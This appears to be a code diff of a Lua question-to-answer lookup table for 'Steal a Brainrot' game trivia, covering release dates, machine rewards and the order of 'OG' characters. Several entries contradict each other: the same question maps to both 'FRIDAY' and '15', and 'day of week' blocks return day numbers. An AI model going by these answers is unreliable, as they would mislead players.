+        "best minifigure in the new series 2",
+        "best minifigure in series 2",
+        "best minifigure series 2",
+        "strongest minifigure toy in the new series 2 minifigures",
+        "strongest minifigure toy in series 2 minifigures",
+        "strongest minifigure toy series 2 minifigures",
+        "strongest minifigure toy in the new series 2",
+        "strongest minifigure toy in series 2",
+        "strongest minifigure toy series 2",
+        "strongest minifigure in the new series 2 minifigures",
+        "strongest minifigure in series 2 minifigures",
+        "strongest minifigure series 2 minifigures",
+        "strongest minifigure in the new series 2",
+        "strongest minifigure in series 2",
+        "strongest minifigure series 2",
+        "rarest minifigure toy in the new series 2 minifigures",
+        "rarest minifigure toy in series 2 minifigures",
+        "rarest minifigure toy series 2 minifigures",
+        "rarest minifigure toy in the new series 2",
+        "rarest minifigure toy in series 2",
+        "rarest minifigure toy series 2",
+        "rarest minifigure in the new series 2 minifigures",
+        "rarest minifigure in series 2 minifigures",
+        "rarest minifigure series 2 minifigures",
+        "rarest minifigure in the new series 2",
+        "rarest minifigure in series 2",
+        "rarest minifigure series 2",
+        -- "toy" only (drop minifigure word)
+        "most op toy in the new series 2 minifigures",
+        "most op toy in series 2 minifigures",
+        "most op toy series 2 minifigures",
+        "most op toy in the new series 2",
+        "most op toy in series 2",
+        "most op toy series 2",
+        -- "op ... " no "most"
+        "op minifigure toy in the new series 2 minifigures",
+        "op minifigure toy in series 2 minifigures",
+        "op minifigure toy series 2 minifigures",
+        "op minifigure toy in the new series 2",
+        "op minifigure toy in series 2",
+        "op minifigure toy series 2",
+        "op minifigure in the new series 2 minifigures",
+        "op minifigure in series 2 minifigures",
+        "op minifigure series 2 minifigures",
+        "op minifigure in the new series 2",
+        "op minifigure in series 2",
+        "op minifigure series 2",
+    },a="GRIFFIN"},
+    {p={
+    -- ⭐ HAUNTED FUSE — best brainrot
+    "haunted fuse best brainrot","haunted fuse best brain","haunted fuse brainrot","haunted fuse machine best brainrot","hauntedfuse best brainrot","hauntedfuse brainrot",
+    "what is the best brainrot in the haunted fuse","whats the best brainrot in the haunted fuse","what is the best brainrot from the haunted fuse","whats the best brainrot from the haunted fuse",
+    "what is the best brainrot in haunted fuse","whats the best brainrot in haunted fuse","what is the best brainrot from haunted fuse","whats the best brainrot from haunted fuse",
+    "best brainrot in the haunted fuse","best brainrot in haunted fuse","best brainrot from the haunted fuse","best brainrot from haunted fuse",
+    "best brainrot from hauntedfuse","best brainrot in hauntedfuse","best haunted fuse brainrot","best hauntedfuse brainrot",
+    "which brainrot is best in the haunted fuse","which brainrot is best from the haunted fuse","which brainrot is best in haunted fuse","which brainrot is best from haunted fuse",
+    "which is the best brainrot in the haunted fuse","which is the best brainrot from the haunted fuse","which is the best haunted fuse brainrot",
+    "strongest brainrot in the haunted fuse","strongest brainrot in haunted fuse","strongest brainrot from the haunted fuse","strongest brainrot from haunted fuse",
+    "strongest haunted fuse brainrot","rarest brainrot in the haunted fuse","rarest brainrot from the haunted fuse","rarest haunted fuse brainrot",
+    "most op brainrot in the haunted fuse","most op brainrot from the haunted fuse","most op haunted fuse brainrot","op haunted fuse brainrot",
+    "top brainrot from the haunted fuse","top brainrot in the haunted fuse","top haunted fuse brainrot",
+    "what comes from the haunted fuse","what brainrot comes from the haunted fuse","what can you get from the haunted fuse",
+    "best thing from the haunted fuse","best thing from haunted fuse","best pet from the haunted fuse","best pet from haunted fuse",
+    "what brainrot do you get from the haunted fuse","what brainrot do i get from the haunted fuse",
+    "haunted best brainrot","haunted fuse best","haunted fuse strongest","haunted fuse rarest",
+},a="PHOENIX"},
+{p={"best craft machine brainrot","best craftmachine brainrot","best brainrot in craft machine","best brainrot from craft machine","strongest craft brainrot","rarest craft brainrot","best brainrot craft","best brainrot from craft"},a="LOSDRAGONS"},
     {p={"last rebirth","the last rebirth","last rebirth we added","most recent rebirth","newest rebirth","latest rebirth","final rebirth","highest rebirth","max rebirth","maximum rebirth","last rebirth level","top rebirth"},a="19"},
-    {p={"sab release date","sab released date","sab date","release date of sab","steal a brainrot release date","when was steal a brainrot released","when did sab release","when did sab come out","sab came out"},a="MAY162025"},
-    {p={"sab release month","sab month released","sab month","month sab was made","release month of sab","what month was sab released"},a="MAY"},
-    {p={"sab release year","sab year released","sab year","year of release","year sab was released","what year was sab released"},a="2025"},
+    {p={
+        -- existing
+        "sab release date","sab released date","sab date","release date of sab","steal a brainrot release date","when was steal a brainrot released","when did sab release","when did sab come out","sab came out",
+        -- ⭐ "maded" spellings
+        "when was sab maded","when sab maded","when sab was maded","when did sab maded","when did sab get maded",
+        "when was sab made","when sab made","when sab was made","when did sab made","when did sab get made",
+        "sab maded date","sab maded when","sab made date","sab made when","sab was maded when","sab was made when",
+        "what date was sab maded","what date sab maded","what date was sab made","what date sab made",
+        "sab maded on","sab made on","what date did sab maded","what date did sab made","what date did sab get maded",
+        -- creation forms
+        "when was sab created","when sab created","sab created date","sab creation date",
+        "when did sab get created","when was sab first made","when was sab first maded","when was sab first created",
+        "what was the date sab was made","what was the date sab was maded","what was the date sab was created",
+        -- release reorders
+        "when sab released","when sab was released","when was sab released date","sab released when",
+        -- short
+        "sab maded day date","sab release","sab released","sab launch date","sab launch","when sab launch","when sab launched",
+        "sab came out when","when sab came out","what date did sab come out","what date sab come out",
+        "what date sab released","what date sab was released","what date sab was maded","what date sab was made",
+    },a="MAY162025"},
+    {p={
+        "sab release month","sab month released","sab month","month sab was made","release month of sab","what month was sab released",
+        -- maded spellings
+        "what month sab maded","what month was sab maded","what month sab made","what month was sab made",
+        "which month sab maded","which month was sab maded","which month sab made","which month was sab made",
+        "sab maded month","sab made month","sab month made","sab month maded","month sab maded","month sab made",
+        "month sab was maded","month sab was made","when sab maded month","what month did sab maded","what month did sab made",
+        -- creation
+        "sab creation month","what month was sab created","which month was sab created","month sab was created",
+        "what month sab created","when was sab created month","what month was sab first made","what month was sab first maded",
+        -- release reframed
+        "sab month of release","what month did sab release","what month sab released","what month did sab come out",
+        "what month sab come out","which month did sab release","which month did sab come out","which month sab come out",
+        "sab release month number","what month sab launched","which month sab launched","sab launch month",
+        "what month sab was released","what month sab was maded","what month sab was made",
+    },a="MAY"},
+    {p={
+        "sab release year","sab year released","sab year","year of release","year sab was released","what year was sab released",
+        -- maded spellings
+        "what year sab maded","what year was sab maded","what year sab made","what year was sab made",
+        "which year sab maded","which year was sab maded","which year sab made","which year was sab made",
+        "sab maded year","sab made year","sab year made","sab year maded","year sab maded","year sab made",
+        "year sab was maded","year sab was made","when sab maded year","when was sab maded year",
+        "what year did sab maded","what year did sab made","what year did sab get maded","what year did sab get made",
+        -- creation
+        "sab creation year","what year was sab created","which year was sab created","year sab was created",
+        "what year sab created","when was sab created year","when sab created year",
+        "what year was sab first made","what year was sab first maded",
+        -- release reframed
+        "sab year of release","what year did sab release","what year sab released","what year did sab come out",
+        "what year sab come out","which year did sab release","which year did sab come out","which year sab come out",
+        "sab release year number","what year sab launched","which year sab launched","sab launch year",
+        "what year sab was released","what year sab was maded","what year sab was made",
+    },a="2025"},
     {p={"sab release day","day sab was released","sab released day","day of release","what day was sab released","what day was sab made"},a="FRIDAY"},
+    {p={
+        -- ⭐ "maded" → day number 16
+        "what day sab maded","what day was sab maded","what day number sab maded","what day number was sab maded",
+        "which day sab maded","which day was sab maded","which day number sab maded","which day number was sab maded",
+        "sab maded day","sab maded day number","day sab maded","day number sab maded",
+        "when sab maded day","when was sab maded day","when sab maded day number","what day did sab maded","what day did sab made",
+        -- created
+        "what day was sab created","which day was sab created","what day sab created",
+        "sab created day","sab creation day","day sab was created","what day number was sab created",
+        -- release day number
+        "what day number was sab released","what day number sab released","sab release day number","day number of sab release",
+        "what day number was sab made","what day number sab made","sab made day number",
+        "what day sab was released","what day sab was maded","what day sab was made",
+    },a="16"},
+    -- ⭐ SAB MADE — DATE (day number 20)
+    {p={
+        -- "does sab made" forms
+        "what date does sab made","what date does sab maded","what date sab made","what date sab maded",
+        "what date did sab made","what date did sab maded","what date was sab made","what date was sab maded",
+        -- reordered
+        "sab made what date","sab maded what date","sab made date number","sab maded date number",
+        "date number sab made","date number sab maded","sab date number","sab release date number",
+        -- whats/what is
+        "what is sab made date","whats sab made date","what is sab maded date","whats sab maded date",
+        "what is the sab made date","whats the sab made date","what is the sab maded date","whats the sab maded date",
+        "what is the date of sab made","what is the date of sab maded","whats the date of sab made","whats the date of sab maded",
+        -- which
+        "which date sab made","which date sab maded","which date was sab made","which date was sab maded",
+        "which date did sab made","which date did sab maded",
+        -- on what date
+        "on what date did sab made","on what date was sab made","on what date did sab maded","on what date was sab maded",
+        -- in sab
+        "what date did sab made in sab","what date was sab made in sab","what date did sab get made","what date did sab get maded",
+        -- made on date
+        "sab made on date","sab maded on date","sab was made on date","sab was maded on date",
+        -- date when
+        "when date sab made","when date sab maded","date when sab made","date when sab maded",
+        "date of sab made","date of sab maded","date of when sab was made","date of when sab was maded",
+        "sab date of made","sab date of maded","the date sab made","the date sab maded",
+        -- give/tell me
+        "give me the date sab made","give me the date sab maded","tell me the date sab made","tell me the date sab maded",
+        "sab made date in sab","sab maded date in sab","sab date made in sab",
+    },a="20"},
+    -- ⭐ SAB MADE — DAY (day of week SATURDAY)
+    {p={
+        -- "does sab made" forms
+        "what day does sab made","what day does sab maded","what day sab made","what day sab maded",
+        "what day did sab made","what day did sab maded","what day was sab made","what day was sab maded",
+        -- reordered
+        "sab made what day","sab maded what day","sab made day of week","sab maded day of week",
+        "day of week sab made","day of week sab maded","sab day of week","sab weekday",
+        -- whats/what is
+        "what is sab made day","whats sab made day","what is sab maded day","whats sab maded day",
+        "what is the sab made day","whats the sab made day","what is the sab maded day","whats the sab maded day",
+        "what is the day of sab made","what is the day of sab maded","whats the day of sab made","whats the day of sab maded",
+        -- which
+        "which day sab made","which day sab maded","which day was sab made","which day was sab maded",
+        "which day did sab made","which day did sab maded",
+        -- on what day
+        "on what day did sab made","on what day was sab made","on what day did sab maded","on what day was sab maded",
+        -- in sab
+        "what day did sab made in sab","what day was sab made in sab","what day did sab get made","what day did sab get maded",
+        -- made on day
+        "sab made on day","sab maded on day","sab was made on day","sab was maded on day",
+        -- day when
+        "when day sab made","when day sab maded","day when sab made","day when sab maded",
+        "day of sab made","day of sab maded","day of when sab was made","day of when sab was maded",
+        "sab day of made","sab day of maded","the day sab made","the day sab maded",
+        -- give/tell me
+        "give me the day sab made","give me the day sab maded","tell me the day sab made","tell me the day sab maded",
+        "sab made day in sab","sab maded day in sab","sab day made in sab",
+    },a="15"},
+    -- ⭐ DUEL MACHINE RELEASE — full date
+    {p={
+        "when was duel machine released in sab","when was duel machine released","when duel machine released",
+        "when was the duel machine released in sab","when was the duel machine released","when the duel machine released",
+        "when was duels machine released in sab","when was duels machine released","when duels machine released",
+        "when was the duels machine released in sab","when was the duels machine released","when the duels machine released",
+        "duel machine release date","duels machine release date","duel machine released date","duels machine released date",
+        "release date of duel machine","release date of duels machine","release date of the duel machine","release date of the duels machine",
+        "what is the duel machine release date","whats the duel machine release date","what is the duels machine release date","whats the duels machine release date",
+        "what is duel machine release date","whats duel machine release date","what is duels machine release date","whats duels machine release date",
+        "when did duel machine release","when did duels machine release","when did the duel machine release","when did the duels machine release",
+        "when did duel machine come out","when did duels machine come out","when duel machine come out","when duels machine come out",
+        "duel machine came out","duels machine came out","duel machine come out","duels machine come out",
+        "when was duel machine maded","when was duel machine made","when was duels machine maded","when was duels machine made",
+        "when duel machine maded","when duel machine made","when duels machine maded","when duels machine made",
+        "duel machine maded date","duel machine made date","duels machine maded date","duels machine made date",
+        "what date was duel machine maded","what date was duel machine made","what date was duels machine maded","what date was duels machine made",
+        "what date was the duel machine maded","what date was the duel machine made","what date was the duels machine maded","what date was the duels machine made",
+        "what date duel machine maded","what date duel machine made","what date duels machine maded","what date duels machine made",
+        "what date was duel machine released","what date was duels machine released","what date duel machine released","what date duels machine released",
+        "what date did duel machine release","what date did duels machine release","what date did the duel machine release","what date did the duels machine release",
+        "when was duel machine created","when was duels machine created","when duel machine created","when duels machine created",
+        "duel machine created date","duels machine created date","duel machine creation date","duels machine creation date",
+        "when was duel machine added","when was duels machine added","when duel machine added","when duels machine added",
+        "when was duel machine added in sab","when was duels machine added in sab","when was the duel machine added in sab","when was the duels machine added in sab",
+        "duel machine added date","duels machine added date","duel machine launch date","duels machine launch date",
+        "duel machine release","duels machine release","duel machine released","duels machine released",
+        "when was duel machine launched","when was duels machine launched","when duel machine launch","when duels machine launch",
+        "when was duel machine added to sab","when was duels machine added to sab","when was the duel machine added to sab",
+    },a="JANUARY102026"},
+    -- ⭐ DUEL MACHINE — month
+    {p={
+        "what month duel machine released","what month was duel machine released","which month duel machine released","which month was duel machine released",
+        "what month was the duel machine released","which month was the duel machine released",
+        "what month duels machine released","what month was duels machine released","which month duels machine released","which month was duels machine released",
+        "what month was the duels machine released","which month was the duels machine released",
+        "duel machine release month","duels machine release month","duel machine month","duels machine month",
+        "month duel machine was released","month duels machine was released","month duel machine released","month duels machine released",
+        "what month duel machine maded","what month was duel machine maded","what month duel machine made","what month was duel machine made",
+        "what month duels machine maded","what month was duels machine maded","what month duels machine made","what month was duels machine made",
+        "which month duel machine maded","which month was duel machine maded","which month duels machine maded","which month was duels machine maded",
+        "duel machine maded month","duel machine made month","duels machine maded month","duels machine made month",
+        "month duel machine maded","month duel machine made","month duels machine maded","month duels machine made",
+        "duel machine month of release","duels machine month of release",
+        "what month did duel machine release","what month did duels machine release","which month did duel machine release","which month did duels machine release",
+        "what month did duel machine come out","what month did duels machine come out","what month duel machine come out","what month duels machine come out",
+        "what month duel machine was released","what month duels machine was released",
+        "what month was duel machine created","which month was duel machine created","what month was duels machine created","which month was duels machine created",
+        "duel machine created month","duels machine created month","duel machine creation month","duels machine creation month",
+        "what month duel machine launched","which month duel machine launched","what month duels machine launched","which month duels machine launched",
+        "duel machine launch month","duels machine launch month",
+    },a="JANUARY"},
+    -- ⭐ DUEL MACHINE — year
+    {p={
+        "what year duel machine released","what year was duel machine released","which year duel machine released","which year was duel machine released",
+        "what year was the duel machine released","which year was the duel machine released",
+        "what year duels machine released","what year was duels machine released","which year duels machine released","which year was duels machine released",
+        "what year was the duels machine released","which year was the duels machine released",
+        "duel machine release year","duels machine release year","duel machine year","duels machine year",
+        "year duel machine was released","year duels machine was released","year duel machine released","year duels machine released",
+        "what year duel machine maded","what year was duel machine maded","what year duel machine made","what year was duel machine made",
+        "what year duels machine maded","what year was duels machine maded","what year duels machine made","what year was duels machine made",
+        "which year duel machine maded","which year was duel machine maded","which year duels machine maded","which year was duels machine maded",
+        "duel machine maded year","duel machine made year","duels machine maded year","duels machine made year",
+        "year duel machine maded","year duel machine made","year duels machine maded","year duels machine made",
+        "duel machine year of release","duels machine year of release",
+        "what year did duel machine release","what year did duels machine release","which year did duel machine release","which year did duels machine release",
+        "what year did duel machine come out","what year did duels machine come out","what year duel machine come out","what year duels machine come out",
+        "what year duel machine was released","what year duels machine was released",
+        "what year was duel machine created","which year was duel machine created","what year was duels machine created","which year was duels machine created",
+        "duel machine created year","duels machine created year","duel machine creation year","duels machine creation year",
+        "what year duel machine launched","which year duel machine launched","what year duels machine launched","which year duels machine launched",
+        "duel machine launch year","duels machine launch year",
+    },a="2026"},
+    -- ⭐ DUEL MACHINE — day of week
+    {p={
+        "what day duel machine released","what day was duel machine released","which day duel machine released","which day was duel machine released",
+        "what day was the duel machine released","which day was the duel machine released",
+        "what day duels machine released","what day was duels machine released","which day duels machine released","which day was duels machine released",
+        "what day was the duels machine released","which day was the duels machine released",
+        "duel machine release day","duels machine release day","duel machine day","duels machine day",
+        "day duel machine was released","day duels machine was released","day duel machine released","day duels machine released",
+        "day of release for duel machine","day of release for duels machine",
+        "what day duel machine maded","what day was duel machine maded","what day duel machine made","what day was duel machine made",
+        "what day duels machine maded","what day was duels machine maded","what day duels machine made","what day was duels machine made",
+        "which day duel machine maded","which day was duel machine maded","which day duels machine maded","which day was duels machine maded",
+        "duel machine maded day","duel machine made day","duels machine maded day","duels machine made day",
+        "day duel machine maded","day duel machine made","day duels machine maded","day duels machine made",
+        "duel machine day of release","duels machine day of release",
+        "what day did duel machine release","what day did duels machine release","which day did duel machine release","which day did duels machine release",
+        "what day did duel machine come out","what day did duels machine come out","what day duel machine come out","what day duels machine come out",
+        "what day duel machine was released","what day duels machine was released",
+        "what day was duel machine created","which day was duel machine created","what day was duels machine created","which day was duels machine created",
+        "duel machine created day","duels machine created day","duel machine creation day","duels machine creation day",
+        "what day duel machine launched","which day duel machine launched","what day duels machine launched","which day duels machine launched",
+        "duel machine launch day","duels machine launch day",
+    },a="10"},
+    -- ⭐ DUEL MACHINE — day number
+    {p={
+        "what day number duel machine released","what day number was duel machine released","which day number duel machine released","which day number was duel machine released",
+        "what day number was the duel machine released","which day number was the duel machine released",
+        "what day number duels machine released","what day number was duels machine released","which day number duels machine released","which day number was duels machine released",
+        "what day number was the duels machine released","which day number was the duels machine released",
+        "duel machine release day number","duels machine release day number","duel machine day number","duels machine day number",
+        "day number duel machine was released","day number duels machine was released","day number duel machine released","day number duels machine released",
+        "day number of release for duel machine","day number of release for duels machine",
+        "what day number duel machine maded","what day number was duel machine maded","what day number duel machine made","what day number was duel machine made",
+        "what day number duels machine maded","what day number was duels machine maded","what day number duels machine made","what day number was duels machine made",
+        "which day number duel machine maded","which day number was duel machine maded","which day number duels machine maded","which day number was duels machine maded",
+        "duel machine maded day number","duel machine made day number","duels machine maded day number","duels machine made day number",
+        "day number duel machine maded","day number duel machine made","day number duels machine maded","day number duels machine made",
+        "duel machine day number of release","duels machine day number of release",
+        "what day number did duel machine release","what day number did duels machine release","which day number did duel machine release","which day number did duels machine release",
+        "what day number did duel machine come out","what day number did duels machine come out","what day number duel machine come out","what day number duels machine come out",
+        "what day number duel machine was released","what day number duels machine was released",
+        "what day number was duel machine created","which day number was duel machine created","what day number was duels machine created","which day number was duels machine created",
+        "duel machine created day number","duels machine created day number","duel machine creation day number","duels machine creation day number",
+        "what day number duel machine launched","which day number duel machine launched","what day number duels machine launched","which day number duels machine launched",
+        "duel machine launch day number","duels machine launch day number",
+    },a="10"},
+    -- ⭐ TRADE PLAZA RELEASE — full date
+    {p={
+        "when was trade plaza released in sab","when was trade plaza released","when trade plaza released",
+        "when was the trade plaza released in sab","when was the trade plaza released","when the trade plaza released",
+        "trade plaza release date","trade plaza released date","release date of trade plaza","release date of the trade plaza",
+        "what is the trade plaza release date","whats the trade plaza release date","what is trade plaza release date","whats trade plaza release date",
+        "when did trade plaza release","when did the trade plaza release","when trade plaza come out","when did trade plaza come out","when did the trade plaza come out",
+        "trade plaza came out","trade plaza come out",
+        "when was trade plaza maded","when was trade plaza made","when trade plaza maded","when trade plaza made",
+        "when was the trade plaza maded","when was the trade plaza made",
+        "trade plaza maded date","trade plaza made date","trade plaza maded when","trade plaza made when",
+        "what date was trade plaza maded","what date was trade plaza made","what date was the trade plaza maded","what date was the trade plaza made",
+        "what date trade plaza maded","what date trade plaza made",
+        "what date was trade plaza released","what date trade plaza released",
+        "what date did trade plaza release","what date did the trade plaza release",
+        "trade plaza maded on","trade plaza made on","what date did trade plaza maded","what date did trade plaza made","what date did trade plaza get maded",
+        "when was trade plaza created","when trade plaza created","trade plaza created date","trade plaza creation date",
+        "when did trade plaza get created","when was trade plaza first made","when was trade plaza first maded","when was trade plaza first created",
+        "what was the date trade plaza was made","what was the date trade plaza was maded","what was the date trade plaza was created",
+        "when trade plaza released","when trade plaza was released","when was trade plaza released date","trade plaza released when",
+        "when was trade plaza added","when was trade plaza added in sab","when was the trade plaza added in sab",
+        "trade plaza added date","trade plaza launch date","trade plaza launch",
+        "when trade plaza launch","when trade plaza launched","when was trade plaza launched",
+        "trade plaza released","trade plaza launch date in sab","when did trade plaza come to sab",
+        -- ⭐ MORE variations
+        "when did trade plaza release in sab","when did the trade plaza release in sab","when was trade plaza released to sab",
+        "trade plaza release date in sab","trade plaza released date in sab","when did they add trade plaza","when did they add the trade plaza",
+        "when did they add trade plaza to sab","when did they add the trade plaza to sab",
+        "when was trade plaza put in sab","when was the trade plaza put in sab","when trade plaza was put in sab",
+        "when was trade plaza added to sab","when was the trade plaza added to sab","when trade plaza was added to sab",
+        "when trade plaza came out","when the trade plaza came out","when did trade plaza came out","when did the trade plaza came out",
+        "what date was trade plaza added","what date trade plaza was added","what date was the trade plaza added",
+        "what date did trade plaza come to sab","what date did the trade plaza come to sab",
+        "trade plaza release full date","trade plaza full release date","whats the trade plaza release date",
+        "whats trade plaza release date","what is the trade plaza release date","what is trade plaza release date",
+        "whats the trade plazas release date","when was the trade plazas released","when was trade plazas released",
+        "trade plaza maded when","trade plaza created when","trade plaza added when","trade plaza added date",
+        "when was trade plaza first added","when was the trade plaza first added","when did trade plaza first release",
+        "when did the trade plaza first release","when was trade plaza first released","when was the trade plaza first released",
+        "trade plazas release date","the trade plazas release date","trade plazas release","trade plazas released",
+        "when trade plazas was released","when trade plazas was added","when did trade plazas release","when did trade plazas come out",
+        "when was trade plazas maded","when was trade plazas made","when was the trade plazas maded","when was the trade plazas made",
+        "trade plazas full date","trade plazas full release date","trade plazas date","trade plazas when",
+        "so when was trade plaza released","when exactly was trade plaza released","when exactly was the trade plaza released",
+        "tell me when trade plaza was released","tell me when the trade plaza was released",
+        "when did the trade plaza come out in sab","when did trade plaza come out in sab",
+        "trade plaza release day in sab","when trade plaza came to sab","when did trade plaza get added","when did trade plaza get added in sab",
+    },a="JUNE202026"},
+    -- ⭐ TRADE PLAZA — month
+    {p={
+        "trade plaza release month","trade plaza month released","trade plaza month","month trade plaza was made","month trade plaza was maded",
+        "release month of trade plaza","what month was trade plaza released","what month trade plaza released",
+        "which month trade plaza released","which month was trade plaza released","which month was the trade plaza released",
+        "what month was the trade plaza released","what month did trade plaza release","which month did trade plaza release",
+        "what month trade plaza maded","what month was trade plaza maded","what month trade plaza made","what month was trade plaza made",
+        "which month trade plaza maded","which month was trade plaza maded","which month trade plaza made","which month was trade plaza made",
+        "trade plaza maded month","trade plaza made month","trade plaza month made","trade plaza month maded",
+        "month trade plaza maded","month trade plaza made","month trade plaza was maded",
+        "when trade plaza maded month","what month did trade plaza maded","what month did trade plaza made",
+        "trade plaza creation month","what month was trade plaza created","which month was trade plaza created","month trade plaza was created",
+        "what month trade plaza created","when was trade plaza created month",
+        "what month was trade plaza first made","what month was trade plaza first maded",
+        "trade plaza month of release","what month did trade plaza come out","what month trade plaza come out",
+        "what month trade plaza launched","which month trade plaza launched","trade plaza launch month",
+        "what month trade plaza was released","what month trade plaza was maded","what month trade plaza was made",
+    },a="JUNE"},
+    -- ⭐ TRADE PLAZA — year
+    {p={
+        "trade plaza release year","trade plaza year released","trade plaza year","year of release trade plaza","year trade plaza was released",
+        "what year was trade plaza released","what year trade plaza released",
+        "which year trade plaza released","which year was trade plaza released","which year was the trade plaza released",
+        "what year was the trade plaza released","what year did trade plaza release","which year did trade plaza release",
+        "what year trade plaza maded","what year was trade plaza maded","what year trade plaza made","what year was trade plaza made",
+        "which year trade plaza maded","which year was trade plaza maded","which year trade plaza made","which year was trade plaza made",
+        "trade plaza maded year","trade plaza made year","trade plaza year made","trade plaza year maded",
+        "year trade plaza maded","year trade plaza made","year trade plaza was maded",
+        "when trade plaza maded year","when was trade plaza maded year",
+        "what year did trade plaza maded","what year did trade plaza made","what year did trade plaza get maded",
+        "trade plaza creation year","what year was trade plaza created","which year was trade plaza created","year trade plaza was created",
+        "what year trade plaza created","when was trade plaza created year",
+        "what year was trade plaza first made","what year was trade plaza first maded",
+        "trade plaza year of release","what year did trade plaza come out","what year trade plaza come out",
+        "what year trade plaza launched","which year trade plaza launched","trade plaza launch year",
+        "what year trade plaza was released","what year trade plaza was maded","what year trade plaza was made",
+    },a="2026"},
+    -- ⭐ TRADE PLAZA — day of week
+    {p={
+        "what day trade plaza released","what day was trade plaza released","which day trade plaza released","which day was trade plaza released",
+        "what day was the trade plaza released","which day was the trade plaza released",
+        "trade plaza release day","trade plaza day","day of release of trade plaza",
+        "day trade plaza was released","day trade plaza released","what day did trade plaza release","which day did trade plaza release",
+        "what day did trade plaza come out","what day trade plaza come out",
+        "what day trade plaza maded","what day was trade plaza maded","what day trade plaza made","what day was trade plaza made",
+        "which day trade plaza maded","which day was trade plaza maded","which day trade plaza made","which day was trade plaza made",
+        "trade plaza maded day","trade plaza made day","day trade plaza maded","day trade plaza made",
+        "what day was trade plaza created","which day was trade plaza created","what day trade plaza created",
+        "trade plaza created day","trade plaza creation day","day trade plaza was created",
+        "what day trade plaza launched","which day trade plaza launched","trade plaza launch day",
+        "what day trade plaza was released","what day trade plaza was maded","what day trade plaza was made",
+    },a="22"},
+    -- ⭐ TRADE PLAZA — day number
+    {p={
+        "what day number trade plaza released","what day number was trade plaza released","which day number trade plaza released","which day number was trade plaza released",
+        "what day number was the trade plaza released","which day number was the trade plaza released",
+        "trade plaza release day number","trade plaza day number","day number of release of trade plaza",
+        "day number trade plaza was released","day number trade plaza released","what day number did trade plaza release",
+        "what day number did trade plaza come out","what day number trade plaza come out",
+        "what day number trade plaza maded","what day number was trade plaza maded","what day number trade plaza made","what day number was trade plaza made",
+        "which day number trade plaza maded","which day number was trade plaza maded","which day number trade plaza made","which day number was trade plaza made",
+        "trade plaza maded day number","trade plaza made day number","day number trade plaza maded","day number trade plaza made",
+        "what day number was trade plaza created","which day number was trade plaza created","what day number trade plaza created",
+        "trade plaza created day number","trade plaza creation day number","day number trade plaza was created",
+        "what day number trade plaza launched","which day number trade plaza launched","trade plaza launch day number",
+        "what day number trade plaza was released","what day number trade plaza was maded","what day number trade plaza was made",
+    },a="22"},
     {p={"what is my favourite food","what is my favorite food","favorite food","favourite food","fav food","my favorite food","food i like","best food"},a="TACO"},
-    {p={"name of animal in last og we added","animal in last og we added","animal in last og","animal in the last og we added"},a="PIG"},
+    {p={"name of animal in last og we added","animal in last og we added","animal in last og","animal in the last og we added"},a="PIGGY"},
     {p={"name of goat","goat name","name of the goat","who is the goat","who is the goat of football","goat of football","football goat"},a="RONALDO"},
     {p={"our planet name","what is our planet name","name of our planet","which planet do we live on","what planet are we on","our planet","planet name"},a="EARTH"},
     {p={"what is my cat name","whats my cat name","my cat name","cat name","cats name","name of my cat","my kitty name","kitty name","cat called"},a="NOVA"},
-    {p={"what is the first og","first og","1st og"},a="STRAWBERRYELEPHANT"},
-    {p={"what is the second og","second og","2nd og"},a="MEOWL"},
-    {p={"what is the third og","third og","3rd og"},a="SKIBIDITOILET"},
-    {p={"what is the fourth og","fourth og","4th og"},a="JOHNPORK"},
+    {p={
+        "first og we added","the first og we added","what is the first og we added","whats the first og we added",
+        "which is the first og we added","which og did we add first","what og did we add first","what og was added first",
+        "which was the first og we added","which og was added first","first og added","the first og added",
+        "whats the first og added","what is the first og added","first og we add","first og we ever added",
+        "the very first og","the very first og we added","very first og we added","our first og","our first og we added",
+        "what is the first og","whats the first og","first og","1st og","the first og","1st og we added","the 1st og we added",
+        "which og is the first","which is the first og","what was the first og we added","what was the first og",
+        "first og brainrot","the first og brainrot","whats the first og brainrot","what is the first og brainrot",
+        "name the first og","name the first og we added","tell me the first og","tell me the first og we added",
+    },a="STRAWBERRYELEPHANT"},
+    {p={
+        "second og we added","the second og we added","what is the second og we added","whats the second og we added",
+        "which is the second og we added","which og did we add second","what og did we add second","what og was added second",
+        "which was the second og we added","which og was added second","second og added","the second og added",
+        "whats the second og added","what is the second og added","second og we add",
+        "what is the second og","whats the second og","second og","2nd og","the second og","2nd og we added","the 2nd og we added",
+        "which og is the second","which is the second og","what was the second og we added","what was the second og",
+        "second og brainrot","the second og brainrot","whats the second og brainrot","what is the second og brainrot",
+        "name the second og","name the second og we added","tell me the second og","tell me the second og we added",
+    },a="MEOWL"},
+    {p={
+        "third og we added","the third og we added","what is the third og we added","whats the third og we added",
+        "which is the third og we added","which og did we add third","what og did we add third","what og was added third",
+        "which was the third og we added","which og was added third","third og added","the third og added",
+        "whats the third og added","what is the third og added","third og we add",
+        "what is the third og","whats the third og","third og","3rd og","the third og","3rd og we added","the 3rd og we added",
+        "which og is the third","which is the third og","what was the third og we added","what was the third og",
+        "third og brainrot","the third og brainrot","whats the third og brainrot","what is the third og brainrot",
+        "name the third og","name the third og we added","tell me the third og","tell me the third og we added",
+    },a="SKIBIDITOILET"},
+    {p={
+        "fourth og we added","the fourth og we added","what is the fourth og we added","whats the fourth og we added",
+        "which is the fourth og we added","which og did we add fourth","what og did we add fourth","what og was added fourth",
+        "which was the fourth og we added","which og was added fourth","fourth og added","the fourth og added",
+        "whats the fourth og added","what is the fourth og added","fourth og we add",
+        "what is the fourth og","whats the fourth og","fourth og","4th og","the fourth og","4th og we added","the 4th og we added",
+        "which og is the fourth","which is the fourth og","what was the fourth og we added","what was the fourth og",
+        "fourth og brainrot","the fourth og brainrot","whats the fourth og brainrot","what is the fourth og brainrot",
+        "name the fourth og","name the fourth og we added","tell me the fourth og","tell me the fourth og we added",
+    },a="JOHNPORK"},
+    {p={
+        -- ⭐ LAST OG we added → JOHNPORK
+        "last og we added","the last og we added","what is the last og we added","whats the last og we added",
+        "which is the last og we added","which was the last og we added","which og did we add last","what og did we add last",
+        "what og was added last","what was the last og we added","last og added","the last og added",
+        "whats the last og added","what is the last og added","last og we add",
+        "last og","the last og","what is the last og","whats the last og","which og is the last","which is the last og",
+        "last og brainrot","the last og brainrot","whats the last og brainrot","what is the last og brainrot",
+        "name the last og","name the last og we added","tell me the last og","tell me the last og we added",
+        "latest og","latest og we added","the latest og","the latest og we added","what is the latest og we added",
+        "newest og","newest og we added","the newest og","the newest og we added","what is the newest og we added",
+        "whats the newest og we added","most recent og","most recent og we added","the most recent og we added",
+        "what is the most recent og we added","final og","final og we added","the final og","the final og we added",
